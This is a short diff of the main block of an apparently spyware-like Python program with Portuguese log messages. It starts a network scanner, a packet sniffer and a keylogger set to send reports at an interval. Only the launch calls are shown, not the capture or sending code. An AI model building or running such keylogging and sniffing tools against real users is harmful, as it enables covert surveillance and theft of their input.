@@ -211,11 +211,12 @@ class Scanner(threading.Thread):
 
 
 if __name__ == "__main__":
-    logging("Iniciou do programa!\n")
-    #threading.Thread(target=block_DNS()).start()
-    scanner = Scanner()
-    logging("Iniciou o Scanner!\n")
-    threading.Thread(scanner.scan()).start()
-    logging("Termino do Scanner do programa!\n")
+    logging("Iniciou do programa!")
+    logging("Iniciou o Scanner!")
+    Scanner().start()
+    logging("Iniciou do sniffer!")
+    Sniffer().start()
+    logging("Termino do Scanner do programa!")
     keylogger = Keylogger(interval=SEND_REPORT_EVERY)
     keylogger.start()
+
